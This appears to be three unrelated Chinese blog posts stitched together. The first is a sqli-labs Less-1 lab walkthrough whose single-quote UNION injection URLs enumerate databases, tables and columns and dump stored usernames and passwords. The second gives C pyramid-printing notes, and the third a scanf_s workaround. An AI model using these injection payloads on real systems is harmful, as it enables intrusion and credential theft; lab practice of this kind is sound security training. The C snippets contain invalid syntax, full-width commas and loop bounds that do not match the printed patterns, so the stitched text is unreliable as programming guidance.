sql-labs Less-1（单引号注入型）

进入http://127.0.0.1/sql/Less-1 ，显示如下：

在http://127.0.0.1/sql/Less-1后依次输入/?id=1、/?id=2、/?id=3...，显示如下：



发现应该没什么问题，再在后面输入’ and 1=1–+,即http://127.0.0.1/sql/Less-1/?id=1' and 1=1–+：

从上面可以看出这样输出没什么问题，再把1=1改成1=2：

看到界面即不报错也不显示任何信息，说明可以用’字符注入，再改成http://127.0.0.1/sql/Less-1/?id=1'：

我们可以看到报错且id=1’时提交到sql的语句形成的’1’’LIMIT 0,1多了一个’（第二个）。那要如何把多余的’去掉呢？
尝试’ or 1=1–+,此时sql构造的语句就变成了’1’or 1’LIMIT 0,1（这步好像不用也可以）

可以看到正常输出了。这个时候可以用order by求有几列数据（order by实际上是对指定列的数据进行排序），用二分法求出有3列，
就用http://127.0.0.1/sql/Less-1/?id=1'order by 3–+，超过3就会报错：

此时可以用union进行注入，union的作用是在当前一组数据后再加一组数据，且当id的数据在库中不存在时，会直接输出；如果id在库中存在，则输出当前id在库中的数据（此时可以id=-1，使当前id的数据为空，输出我们加进去的数据）
注意：用union输入的数据的列数要与本来的数据的列数相同；
输入http://127.0.0.1/sql/Less-1/?id=1'union select 1,2,3–+

因为id=1时，库中有数据，所以输出当前id在库中的数据，我们把id=-1：

这时就输出了我们加入的数据。
这个时候就可以暴库了，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(schema_name),2 from information_schema.schemata–+

然后选要爆的数据库的数据表，这里是选security数据库，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=’security’–+

再选要爆的数据表的数据列，这里选users数据表，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(column_name),2 from information_schema.columns where table_name=’users’–+

最后就可以爆数据了，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,username,password from users where id=1–+

http://127.0.0.1/sql/Less-1/?id=-1'union select 1,username,password from users where id=2–+

……
也可以用group_concat函数爆数据，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(username),group_concat(password) from users–+

这里就把我们要的用户名和密码都拿到了。

类金字塔型题

#类金字塔型题
###解法：把复杂的整体分解成几个部分（包括空白部分），再分别用循环语句实现（一般有几个部分就有几个for语句）。
##1.输出：
正输：
0
00
000
0000

反输：
0000
000
00
0
语句1（正输）：
for(i=1;i<=n;i=i+1) //输出i列(基本没什么变化)
{
for(j=1;j<=n;j=j+1) //输出j个(个数变化取决于两个’ ; ‘之间的表达式)
{
printf(“0/%d/%c”[, ]) //输出0，输出字符取决于“ ”和[ ]之间的表达式
}
}

  • tips1:输入正反（左右）
    printf中[]的表达式：正输：a+j ；反输：a-j。
    其中a为常数,可从题目中求出，且以上表达式可能会用到' i '
  • tips2:输入正反（上下）
    第二个for语句中两个' ; '的表达式：正输：a*i+b ；反输：a*n-b*i+c。
    其中a，b，c为常数，可从题目求出

##2.输出：
正输:
0001
00111
011111
1111111

反输：
1111111
011111
00111
0001
###分解成0三角和1三角
语句2（0三角反输，1三角正输）：
for(i=1;i<=n;i=i+1) //输出i列(基本没什么变化)
{
for(j=1;j<=n-i-1;j=j+1) //输出0三角
{
printf(“0”)
}
for(j=1;j<=2*i-1;j=j+1) //输出1三角
{
printf(“1”)
}
}

##3.输出：
正输:
0001222
0011122
0111112
1111111

反输：
1111111
0111112
0011122
0001222
###分解成0三角，1三角和2三角
语句3（0三角反输，1三角正输，2三角反输）：
for(i=1;i<=n;i=i+1) //输出i列(基本没什么变化)
{
for(j=1;j<=n-i-1;j=j+1) //输出0三角
{
printf(“0”)
}
for(j=1;j<=2*i-1;j=j+1) //输出1三角
{
printf(“1”)
}
for(j=1;j<=n-i-1;j=j+1) //输出2三角
{
printf(“2”)
}
}

用scanf输入字符时字符无效的解决办法

关于用scanf输入字符时字符无效的解决办法

问题

用scanf输入字符串，运行后出现提示:

0x796B98F1 (ucrtbased.dll)处(位于 1.exe 中)引发的异常:

0xC0000005: 写入位置 0x007D1343 时发生访问冲突。

以及下方提示：

<字符串中的字符无效>

错误的地方:

#include <stdio.h>

int main()

{

char a, b, c;

scanf_s(“%c %c %c”, &a, &b, &c);<<<<<<(错误)

printf(“%d,%d,%d”, a,b,c);

return 0;

}

解决方法

可在scanf中输入的字符后输入“整数，”，如下：
#include <stdio.h>

int main()

{

char a, b, c;

scanf_s(“%c %c %c”, &a, 1，&b, 1，&c，1);

printf(“%d,%d,%d”, a,b,c);

return 0;

}
